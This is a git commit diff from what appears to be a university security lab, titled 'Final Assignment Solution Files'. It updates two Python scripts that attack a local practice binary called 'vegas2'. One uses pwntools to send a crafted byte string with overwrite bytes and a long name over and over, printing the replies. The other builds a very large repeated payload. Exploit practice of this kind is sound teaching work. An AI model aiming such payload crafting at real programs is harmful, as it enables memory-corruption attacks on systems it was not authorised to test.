0a47f54e939978571d0dfc7605d5dc634d4fd2ac
BikashBeheraIITM <cs19m019@smail.iitm.ac.in>
2021-02-16 04:32:28 -0500

    Final Assignment Solution Files

--- Lab1/helper.py
+++ Lab1/helper.py
@@ -1,4 +1,15 @@
 from pwn import *
 io = process('./vegas2')
+exploit_string = "100020003000400050006000700080009000\x55\x55\x55\x55\xff\xff\xff\x7f"
+winner_name = "B"
+for i in range(1,100):
+	winner_name += "B"
 while(1):
-	io.sendline("100020003000400050006000700080009000\x55\x55\x55\x55\xff\xff\xff\x7f")
+	io.sendline(exploit_string)
+	io.sendline(winner_name)
+	x1 = io.recvline()
+	x2 = io.recvline()
+	x3 = io.recvline()
+	x4 = io.recvline()
+	x5 = io.recvline()
+	print(x1 + x2 + x3 + x4 + x5)
--- Lab1/m_e1.py
+++ Lab1/m_e1.py
@@ -1,5 +1,6 @@
-str = "100020003000400050006000700080009000\x55\x55\x55\x55\xff\xff\xff\x7f"
-n = 1000000
-for i in range(n-1):
+str = "100020003000400050006000700080009000\x55\x55\x55\x55\xff\xff\xff\x7f\x0a"
+i = 1
+while(i < 1000000):
 	str += str
+	i += i
 print(str)
